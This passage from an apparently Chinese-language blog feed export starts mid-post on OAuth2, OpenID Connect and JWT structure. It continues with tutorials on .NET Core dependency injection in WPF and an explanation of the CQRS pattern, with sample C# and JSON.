<h2 id="授权过程"><a href="#授权过程" class="headerlink" title="授权过程"></a>授权过程</h2><ol>
<li>用户打开客户端以后，客户端要求用户给予授权。（阿姨打开某公寓 App 申请临时密码）</li>
<li>用户同意给予客户端授权。 （我同意给予临时密码）</li>
<li>客户端使用上一步获得的授权，向认证服务器申请令牌。 （同意后，向某某公寓后台申请临时密码）</li>
<li>认证服务器对客户端进行认证以后，确认无误，同意发放令牌。（某某公寓后台确认我同意给予临时密码后，给阿姨发放临时密码）</li>
<li>客户端使用令牌，向资源服务器申请获取资源。（阿姨使用临时密码来开门）</li>
<li>资源服务器确认令牌无误，同意向客户端开放资源。（密码锁收到临时密码验证后开门）</li>
</ol>
<p>&emsp;&emsp;OAuth 关注的是 Authorization（授权）。</p>
<h1 id="OpenId-Connect"><a href="#OpenId-Connect" class="headerlink" title="OpenId Connect"></a>OpenId Connect</h1><p>&emsp;&emsp;OpenID Connect 简称 OIDC。因为 OAuth2 是一个授权协议，它无法提供完善的身份认证功能。所以它在 OAuth2 上构建了一个身份层，是一个基于 OAuth2 协议的身份认证标准协议。OIDC 使用 OAuth2 的授权来为第三方客户端提供用户的身份认证,并把对应的身份认证信息传递给客户端，且可以适用于各种类型的客户端,并且完全兼容 OAuth2，也就是说你搭建了一个OIDC的服务后，也可以当作一个 OAuth2 的服务来用。</p>
<h1 id="术语介绍"><a href="#术语介绍" class="headerlink" title="术语介绍"></a>术语介绍</h1><figure class="image-box">
                <img src="3.png" alt title class>
                <p></p>
            </figure>

<ul>
<li>User - 用户。</li>
<li>Client - 客户端。</li>
<li>IdentityServer - 授权认证服务器。</li>
<li>Resources - 需要保护的资源。</li>
<li>Access Token - 访问令牌,允许用户哪些资源。</li>
<li>Identity Token - 身份令牌,用户确认用户身份。</li>
</ul>
<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>&emsp;&emsp;Json Web Token (JWT)，是为了在网络应用环境间传递声明而执行的一种基于 JSON 的开放标准（RFC 7519）。该 token 被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT 的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该 token 也可直接被用于认证，也可被加密。<br>&emsp;&emsp;JWT 是由三段字符串拼接而成的,使用 <code>.</code> 分割的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJSUzI1NiIsImtpZCI6IjIxNmd3ZUVTZTA3d29hSDhpWHAzMUEiLCJ0eXAiOiJhdCtqd3QifQ.eyJuYmYiOjE1NzY2NTYwOTMsImV4cCI6MTU3NjY1OTY5MywiaXNzIjoiaHR0cDovL2xvY2FsaG9zdDo1MDAzIiwiYXVkIjoiQXBpX0EiLCJjbGllbnRfaWQiOiJjbGllbnRfYSIsInNjb3BlIjpbIkFwaV9BIl19.kdszQIZFTS8aURbF5lIL1-qFzkJ79plH0seM4TsrTPdZoWakJVTH76-qmRpu6H6eaQt7U10R-Y8fn5N2FFh6XHRuDufEsDL8R2Tv7Cu0qbHKHTi-LgZcU2CxM22RyL6Df7Z0IpG5uEQqJ2LyxHJg3W-D3TgSNXUA8ge87ghGrhLRQ8hywH5gM4EZy9lKO7vMZml1IIfuyXTC8FU-HUn6-ZmvC1mADlAQJv84WHyg7fzzgNXqztvSyXA2p6jJG5FDgAjA9-yWnqJPxlZe7-Qi5Dj67lEF9kSII0tblV8JpxxJTpUvM2iPMLKWw77HDGaZkfAUu9WsbpQv-zWXPBBpbw</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;我们通过 <a href="https://jwt.io/" target="_blank" rel="noopener">jwt.io</a> 解析出来。</p>
<figure class="image-box">
                <img src="4.png" alt title class>
                <p></p>
            </figure>

<h2 id="第一部分-Header"><a href="#第一部分-Header" class="headerlink" title="第一部分 Header"></a>第一部分 Header</h2><ul>
<li>alg - 签名算法</li>
<li>kid - 密钥的 Id</li>
<li>typ - token 类型</li>
</ul>
<p>&emsp;&emsp;这三个参数是最常见的。</p>
<h2 id="第二部分-PayLoad"><a href="#第二部分-PayLoad" class="headerlink" title="第二部分 PayLoad"></a>第二部分 PayLoad</h2><ul>
<li>nbf - 生效时间</li>
<li>exp - 过期时间</li>
<li>iss - 令牌发放者</li>
<li>chlien_Id - 发放客户端 Id</li>
<li>aud - 令牌接收方</li>
<li>scope - 可访问资源</li>
</ul>
<p>&emsp;&emsp;在 PayLoad 中可以放置任何你想要的参数。</p>
<h2 id="第三部分-Signature"><a href="#第三部分-Signature" class="headerlink" title="第三部分 Signature"></a>第三部分 Signature</h2><p>&emsp;&emsp;Signature 是对前两部分的签名，防止数据篡改。</p>
<h2 id="JWT-的认证过程"><a href="#JWT-的认证过程" class="headerlink" title="JWT 的认证过程"></a>JWT 的认证过程</h2><figure class="image-box">
                <img src="5.png" alt title class>
                <p></p>
            </figure>

<ol>
<li>用户使用账号密码或别的方式登陆</li>
<li>服务器接受到登陆请求后生成一个 jwt token</li>
<li>服务器把 jwt token 返回给客户端</li>
<li>客户端在请求资源在 Header 中的 authorization 带上 jwt token</li>
<li>服务器对 jwt 进行验签,验签成功后根据 PayLoad 中的信息判断认证是否通过</li>
<li>响应客户端结果</li>
</ol>
<h1 id="授权方式"><a href="#授权方式" class="headerlink" title="授权方式"></a>授权方式</h1><ul>
<li>Client Credentials - 客户端授权模式。 - <a href="https://www.cnblogs.com/linhuiy/p/12084944.html" target="_blank" rel="noopener">实现传送门</a></li>
<li>Resource Owner Password Credentials - 密码模式。 - <a href="https://www.cnblogs.com/linhuiy/p/12084940.html" target="_blank" rel="noopener">实现传送门</a></li>
<li>Implicit - 授权码简化模式。</li>
<li>Authorization Code - 授权码模式。</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> ASPNETCore </tag>
            
            <tag> IdentityServer4 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[在 WPF 中使用 .NET Core 3.0 依赖项注入和服务提供程序]]></title>
      <url>/2019/12/24/UseMicrosoftDependencyInjectionInWPF/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/muran/p/11759899.html" target="_blank" rel="noopener">https://www.cnblogs.com/muran/p/11759899.html</a></p>
</blockquote>
<a id="more"></a>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp;我们都知道 .NET Core 提供了对依赖项注入的内置支持。我们通常在 ASP.NET Core 中使用它（从 Startup.cs 文件中的 ConfigureServices 方法开始），但是该功能不限于此框架，我们可以在 WPF 和 Windows Forms 应用程序中使用它。</p>
<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h2><figure class="image-box">
                <img src="mrDyWlXKsqhETjQ.png" alt title class>
                <p></p>
            </figure>

<h2 id="将所需的-NuGet-包添加到项目中"><a href="#将所需的-NuGet-包添加到项目中" class="headerlink" title="将所需的 NuGet 包添加到项目中"></a>将所需的 NuGet 包添加到项目中</h2><ul>
<li>Microsoft.Extensions.DependencyInjection</li>
<li>Microsoft.Extensions.Options.ConfigurationExtensions</li>
<li>Microsoft.Extensions.Configuration.Json</li>
</ul>
<figure class="image-box">
                <img src="pIobqx4eXm8APMB.png" alt title class>
                <p></p>
            </figure>

<h2 id="然后，将一个名为-appsettings-json-的文件添加到项目的根文件夹。将其“构建操作”属性设置为“内容”，将“复制到输出目录”设置为“-复制”（如果较新）"><a href="#然后，将一个名为-appsettings-json-的文件添加到项目的根文件夹。将其“构建操作”属性设置为“内容”，将“复制到输出目录”设置为“-复制”（如果较新）" class="headerlink" title="然后，将一个名为 appsettings.json 的文件添加到项目的根文件夹。将其“构建操作”属性设置为“内容”，将“复制到输出目录”设置为“ 复制”（如果较新）"></a>然后，将一个名为 appsettings.json 的文件添加到项目的根文件夹。将其“构建操作”属性设置为“内容”，将“复制到输出目录”设置为“ 复制”（如果较新）</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"AppSettings"</span>: &#123;</span><br><span class="line">    <span class="attr">"AppName"</span>: <span class="string">"SampleNetCore3WpfDependencyInjection"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="创建一个-AppSettings-cs-文件来保存配置设置。该文件将映射我们在-appsettings-json-中编写的设置"><a href="#创建一个-AppSettings-cs-文件来保存配置设置。该文件将映射我们在-appsettings-json-中编写的设置" class="headerlink" title="创建一个 AppSettings.cs 文件来保存配置设置。该文件将映射我们在 appsettings.json 中编写的设置"></a>创建一个 AppSettings.cs 文件来保存配置设置。该文件将映射我们在 appsettings.json 中编写的设置</h2><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AppSettings</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> AppName &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="创建一个示例服务"><a href="#创建一个示例服务" class="headerlink" title="创建一个示例服务"></a>创建一个示例服务</h2><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">ISampleService</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">Task&lt;<span class="keyword">string</span>&gt; <span class="title">GetCurrentDate</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SampleService</span> : <span class="title">ISampleService</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">async</span> Task&lt;<span class="keyword">string</span>&gt; <span class="title">GetCurrentDate</span>(<span class="params"></span>)</span> =&gt; </span><br><span class="line">    <span class="keyword">await</span> Task.FromResult(DateTime.Now.ToLongDateString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后像往常一样在 IOC 容器中注册服务：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services.AddScoped&lt;ISampleService, SampleService&gt;();</span><br></pre></td></tr></table></figure>

<h2 id="打开-App-xaml-文件并删除-Application-类的-StartupUri-属性。然后，我们需要重写-App-xaml-cs-中的-OnStartup-方法"><a href="#打开-App-xaml-文件并删除-Application-类的-StartupUri-属性。然后，我们需要重写-App-xaml-cs-中的-OnStartup-方法" class="headerlink" title="打开 App.xaml 文件并删除 Application 类的 StartupUri 属性。然后，我们需要重写 App.xaml.cs 中的 OnStartup 方法"></a>打开 App.xaml 文件并删除 Application 类的 StartupUri 属性。然后，我们需要重写 App.xaml.cs 中的 OnStartup 方法</h2><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">App</span> : <span class="title">Application</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> IServiceProvider ServiceProvider &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> IConfiguration Configuration &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">OnStartup</span>(<span class="params">StartupEventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> builder = <span class="keyword">new</span> ConfigurationBuilder()</span><br><span class="line">                .SetBasePath(Directory.GetCurrentDirectory())</span><br><span class="line">                .AddJsonFile(<span class="string">"appsettings.json"</span>, optional: <span class="literal">false</span>, reloadOnChange: <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        Configuration = builder.Build();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> serviceCollection = <span class="keyword">new</span> ServiceCollection();</span><br><span class="line">        ConfigureServices(serviceCollection);</span><br><span class="line"></span><br><span class="line">        ServiceProvider = serviceCollection.BuildServiceProvider();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> mainWindow = ServiceProvider.GetRequiredService&lt;MainWindow&gt;();</span><br><span class="line">        mainWindow.Show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        services.Configure&lt;AppSettings&gt;(Configuration.GetSection(<span class="keyword">nameof</span>(AppSettings)));</span><br><span class="line">        services.AddScoped&lt;ISampleService, SampleService&gt;();</span><br><span class="line">        services.AddTransient(<span class="keyword">typeof</span>(MainWindow));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="MainWindow-简单布局及代码改造"><a href="#MainWindow-简单布局及代码改造" class="headerlink" title="MainWindow 简单布局及代码改造"></a>MainWindow 简单布局及代码改造</h2><p>&emsp;&emsp;如上所述，MainWindow 位于 IOC 容器中。因此，当我们从服务提供商处获得服务时，它将自动注入所有必需的服务（如果有）。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">MainWindow</span> : <span class="title">Window</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> ISampleService sampleService;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> AppSettings settings;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MainWindow</span>(<span class="params">ISampleService sampleService, IOptions&lt;AppSettings&gt; settings</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        InitializeComponent();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.sampleService = sampleService;</span><br><span class="line">        <span class="keyword">this</span>.settings = settings.Value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">async</span> <span class="keyword">void</span> <span class="title">Button_Click</span>(<span class="params"><span class="keyword">object</span> sender, RoutedEventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> serviceData =<span class="keyword">await</span> sampleService.GetCurrentDate();</span><br><span class="line">        <span class="keyword">var</span> settingsData = settings;</span><br><span class="line">        TextBox1.Text = <span class="string">$"serviceData:<span class="subst">&#123;serviceData&#125;</span><span class="subst">&#123;Environment.NewLine&#125;</span>settingsData:<span class="subst">&#123;settings.AppName&#125;</span>"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="fT2GzqF65CP1Wc8.png" alt title class>
                <p></p>
            </figure>

<h2 id="Demo-地址"><a href="#Demo-地址" class="headerlink" title="Demo 地址"></a>Demo 地址</h2><p><a href="https://github.com/xhanb/NetCore3WpfDependencyInjection" target="_blank" rel="noopener">https://github.com/xhanb/NetCore3WpfDependencyInjection</a></p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> WPF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[浅谈命令查询职责分离（CQRS）模式]]></title>
      <url>/2019/12/23/IntroductionToCQRS/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/yangecnu/p/Introduction-CQRS.html" target="_blank" rel="noopener">https://www.cnblogs.com/yangecnu/p/Introduction-CQRS.html</a><br>CQRS 和 Event Sourcing 没有直接的关系。</p>
</blockquote>
<a id="more"></a>

<p>&emsp;&emsp;在常用的三层架构中，通常都是通过数据访问层来修改或者查询数据，一般修改和查询使用的是相同的实体。在一些业务逻辑简单的系统中可能没有什么问题，但是随着系统逻辑变得复杂，用户增多，这种设计就会出现一些性能问题。虽然在 DB 上可以做一些读写分离的设计，但在业务上如果在读写方面混合在一起的话，仍然会出现一些问题。<br>&emsp;&emsp;本文介绍了命令查询职责分离模式（Command Query Responsibility Segregation，CQRS），该模式从业务上分离修改 （Command，增，删，改，会对系统状态进行修改）和查询（Query，查，不会对系统状态进行修改）的行为。从而使得逻辑更加清晰，便于对不同部分进行针对性的优化。文章首先简要介绍了传统的 CRUD 方式存在的问题，接着介绍了 CQRS 模式，最后以一个简单的在线日记系统演示了如何实现 CQRS 模式。要谈到读写操作，首先我们来看传统的 CRUD 的问题。  </p>
<h1 id="CRUD-方式的问题"><a href="#CRUD-方式的问题" class="headerlink" title="CRUD 方式的问题"></a>CRUD 方式的问题</h1><p>&emsp;&emsp;在以前的管理系统中，命令（Command，通常用来更新数据，操作 DB）和查询（Query）通常使用的是在数据访问层中 Repository 中的实体对象（这些对象是对 DB 中表的映射），这些实体有可能是 SQLServer 中的一行数据或者多个表。<br>&emsp;&emsp;通常对 DB 执行的增，删，改，查（CRUD）都是针对的系统的实体对象。如通过数据访问层获取数据，然后通过数据传输对象 DTO 传给表现层。或者，用户需要更新数据，通过 DTO 对象将数据传给 Model，然后通过数据访问层写回数据库，系统中的所有交互都是和数据查询和存储有关，可以认为是数据驱动（<a href="http://en.wikipedia.org/wiki/Data-driven_programming" target="_blank" rel="noopener">Data-Driven</a>）的，如下图：</p>
<figure class="image-box">
                <img src="261851410161370.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;对于一些比较简单的系统，使用这种 CRUD 的设计方式能够满足要求。特别是通过一些代码生成工具及 ORM 等能够非常方便快速的实现功能。  </p>
<p>但是<a href="http://msdn.microsoft.com/en-us/library/ms978509.aspx" target="_blank" rel="noopener">传统的 CRUD 方法有一些问题</a>：</p>
<ul>
<li>使用同一个对象实体来进行数据库读写可能会太粗糙，大多数情况下，比如编辑的时候可能只需要更新个别字段，但是却需要将整个对象都穿进去，有些字段其实是不需要更新的。在查询的时候在表现层可能只需要个别字段，但是需要查询和返回整个实体对象。</li>
<li>使用同一实体对象对同一数据进行读写操作的时候，可能会遇到资源竞争的情况，经常要处理的锁的问题，在写入数据的时候，需要加锁。读取数据的时候需要判断是否允许脏读。这样使得系统的逻辑性和复杂性增加，并且会对系统吞吐量的增长会产生影响。</li>
<li>同步的，直接与数据库进行交互在大数据量同时访问的情况下可能会影响性能和响应性，并且可能会产生性能瓶颈。</li>
<li>由于同一实体对象都会在读写操作中用到，所以对于安全和权限的管理会变得比较复杂。</li>
</ul>
<p>&emsp;&emsp;这里面很重要的一个问题是，<strong>系统中的读写频率比</strong>，是偏向读，还是偏向写，就如同一般的<strong>数据结构在查找和修改上时间复杂度</strong>不一样，在设计系统的结构时也需要考虑这样的问题。解决方法就是我们经常用到的对数据库进行读写分离。 让主数据库处理事务性的增，删，改操作（Insert, Update, Delete 操作），让从数据库处理查询操作（Select 操作），数据库复制被用来将事务性操作导致的变更同步到集群中的从数据库。这只是从 DB 角度处理了读写分离，但是从业务或者系统上面读和写仍然是存放在一起的。他们都是用的同一个实体对象。<br>&emsp;&emsp;要从业务上将读和写分离，就是接下来要介绍的命令查询职责分离模式。  </p>
<h1 id="什么是-CQRS"><a href="#什么是-CQRS" class="headerlink" title="什么是 CQRS"></a>什么是 CQRS</h1><p>&emsp;&emsp;CQRS 最早来自于 Betrand Meyer（Eiffel 语言之父，<a href="http://msdn.microsoft.com/en-us/magazine/cc546578.aspx" target="_blank" rel="noopener">开-闭原则</a> OCP 提出者）在 <a href="http://www.amazon.com/gp/product/0136291554" target="_blank" rel="noopener">Object-Oriented Software Construction</a> 这本书中提到的一种 <a href="http://martinfowler.com/bliki/CommandQuerySeparation.html" target="_blank" rel="noopener">命令查询分离</a> （<a href="http://en.wikipedia.org/wiki/Command-query_separation" target="_blank" rel="noopener">Command Query Separation</a>, CQS） 的概念。其基本思想在于，任何一个对象的方法可以分为两大类：</p>
<ul>
<li>命令（Command）：不返回任何结果（void），但会改变对象的状态。</li>
<li>查询（Query）：返回结果，但是不会改变对象的状态，对系统没有副作用。</li>
</ul>
<p>&emsp;&emsp;根据 CQS 的思想，任何一个方法都可以拆分为命令和查询两部分，比如：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">Increase</span>(<span class="params"><span class="keyword">int</span> <span class="keyword">value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    i += <span class="keyword">value</span>;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这个方法，我们执行了一个命令即对变量 i 进行相加，同时又执行了一个 Query，即查询返回了 i 的值，如果按照 CQS 的思想，该方法可以拆成 Command 和 Query 两个方法，如下：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">IncreaseCommand</span>(<span class="params"><span class="keyword">int</span> <span class="keyword">value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    i += <span class="keyword">value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">QueryValue</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;操作和查询分离使得我们能够更好的把握对象的细节，能够更好的理解哪些操作会改变系统的状态。当然 <a href="http://en.wikipedia.org/wiki/Command-query_separation" target="_blank" rel="noopener">CQS</a> 也有一些缺点，比如代码需要处理多线程的情况。<br>&emsp;&emsp;CQRS 是对 CQS 模式的进一步改进成的一种简单模式。 它由 Greg Young 在 <a href="http://codebetter.com/gregyoung/2010/02/16/cqrs-task-based-uis-event-sourcing-agh/" target="_blank" rel="noopener">CQRS, Task Based UIs, Event Sourcing agh!</a> 这篇文章中提出。“ CQRS 只是简单的将之前只需要创建一个对象拆分成了两个对象，这种分离是基于方法是执行命令还是执行查询这一原则来定的（这个和 CQS 的定义一致）”。<br>&emsp;&emsp;CQRS 使用分离的接口将数据查询操作（Queries）和数据修改操作（Commands）分离开来，这也意味着在查询和更新过程中使用的数据模型也是不一样的。这样读和写逻辑就隔离开来了。</p>
<figure class="image-box">
                <img src="261851415951714.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;使用 CQRS 分离了读写职责之后，可以对数据进行读写分离操作来改进性能，可扩展性和安全。如下图：</p>
<figure class="image-box">
                <img src="261851421105570.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;主数据库处理 CUD，从库处理 R，从库的的结构可以和主库的结构完全一样，也可以不一样，从库主要用来进行只读的查询操作。在数量上从库的个数也可以根据查询的规模进行扩展，在业务逻辑上，也可以根据专题从主库中划分出不同的从库。从库也可以实现成 <a href="http://martinfowler.com/bliki/ReportingDatabase.html" target="_blank" rel="noopener">ReportingDatabase</a>，根据查询的业务需求，从主库中抽取一些必要的数据生成一系列查询报表来存储。</p>
<figure class="image-box">
                <img src="261851428451429.png" alt title class>
                <p></p>
            </figure>

<p>使用 ReportingDatabase 的一些优点通常可以使得查询变得更加简单高效：</p>
<ul>
<li>ReportingDatabase 的结构和数据表会针对常用的查询请求进行设计。</li>
<li>ReportingDatabase 数据库通常会去正规化，存储一些冗余而减少必要的 Join 等联合查询操作，使得查询简化和高效，一些在主数据库中用不到的数据信息，在 ReportingDatabase 可以不用存储。</li>
<li>可以对 ReportingDatabase 重构优化，而不用去改变操作数据库。</li>
<li>对 ReportingDatabase 数据库的查询不会给操作数据库带来任何压力。</li>
<li>可以针对不同的查询请求建立不同的 ReportingDatabase 库。</li>
</ul>
<p>&emsp;&emsp;当然这也有一些缺点，比如从库数据的更新。如果使用 SQLServer，本身也提供了一些如故障转移和复制机制来方便部署。</p>
<h1 id="什么时候可以考虑-CQRS"><a href="#什么时候可以考虑-CQRS" class="headerlink" title="什么时候可以考虑 CQRS"></a>什么时候可以考虑 CQRS</h1><p>CQRS 模式有一些优点：</p>
<ol>
<li>分工明确，可以负责不同的部分</li>
<li>将业务上的命令和查询的职责分离能够提高系统的性能、可扩展性和安全性。并且在系统的演化中能够保持高度的灵活性，能够防止出现 CRUD 模式中，对查询或者修改中的某一方进行改动，导致另一方出现问题的情况。</li>
<li>逻辑清晰，能够看到系统中的那些行为或者操作导致了系统的状态变化。</li>
<li>可以从数据驱动（Data-Driven） 转到任务驱动（Task-Driven）以及事件驱动（Event-Driven）.</li>
</ol>
<p>在下场景中，可以考虑使用 CQRS 模式：</p>
<ol>
<li>当在业务逻辑层有很多操作需要相同的实体或者对象进行操作的时候。CQRS 使得我们可以对读和写定义不同的实体和方法，从而可以减少或者避免对某一方面的更改造成冲突</li>
<li>对于一些基于任务的用户交互系统，通常这类系统会引导用户通过一系列复杂的步骤和操作，通常会需要一些复杂的领域模型，并且整个团队已经熟悉领域驱动设计技术。写模型有很多和业务逻辑相关的命令操作的堆，输入验证，业务逻辑验证来保证数据的一致性。读模型没有业务逻辑以及验证堆，仅仅是返回 DTO 对象为视图模型提供数据。读模型最终和写模型相一致。</li>
<li>适用于一些需要对查询性能和写入性能分开进行优化的系统，尤其是读/写比非常高的系统，横向扩展是必须的。比如，在很多系统中读操作的请求时远大于写操作。为适应这种场景，可以考虑将写模型抽离出来单独扩展，而将写模型运行在一个或者少数几个实例上。少量的写模型实例能够减少合并冲突发生的情况</li>
<li>适用于一些团队中，一些有经验的开发者可以关注复杂的领域模型，这些用到写操作，而另一些经验较少的开发者可以关注用户界面上的读模型。</li>
<li>对于系统在将来会随着时间不段演化，有可能会包含不同版本的模型，或者业务规则经常变化的系统</li>
<li>需要和其他系统整合，特别是需要和事件溯源 Event Sourcing 进行整合的系统，这样子系统的临时异常不会影响整个系统的其他部分。</li>
</ol>
<p>但是在以下场景中，可能不适宜使用 CQRS：</p>
<ol>
<li>领域模型或者业务逻辑比较简单，这种情况下使用 CQRS 会把系统搞复杂。</li>
<li>对于简单的，CRUD 模式的用户界面以及与之相关的数据访问操作已经足够的话，没必要使用 CQRS，这些都是一个简单的对数据进行增删改查。</li>
<li>不适合在整个系统中到处使用该模式。在整个数据管理场景中的特定模块中 CQRS 可能比较有用。但是在有些地方使用 CQRS 会增加系统不必要的复杂性。</li>
</ol>
